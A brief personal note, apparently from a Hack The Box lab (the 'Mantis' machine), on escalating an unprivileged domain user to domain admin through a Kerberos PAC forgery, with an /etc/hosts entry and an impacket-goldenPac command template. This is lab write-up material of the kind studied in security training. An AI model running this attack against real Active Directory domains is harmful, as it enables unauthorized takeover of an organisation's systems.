allows an unprivileged domain user to create a golden ticket with Kerberos, giving them domain admin privileges
  
the github exploit for this actually just doesn’t work, but you can use impacket instead
- in order to use impacket-goldenPac, you need to get the FQDN of the server, and put that information into your /etc/hosts
- for example, in mantis, this is what we used
    
    - we found FQDN from nmap scan

- then put this in /etc/hosts
```JavaScript
10.10.10.52 mantis htb.local mantis.htb.local
```
  
then just run the impacket script
```JavaScript
impacket-goldenPac <second_half_domain>/<user>:<pass>@<first_half_domain>
```
- not sure if “first_half_domain” and “second_half_domain” is technically right but you can play around with it
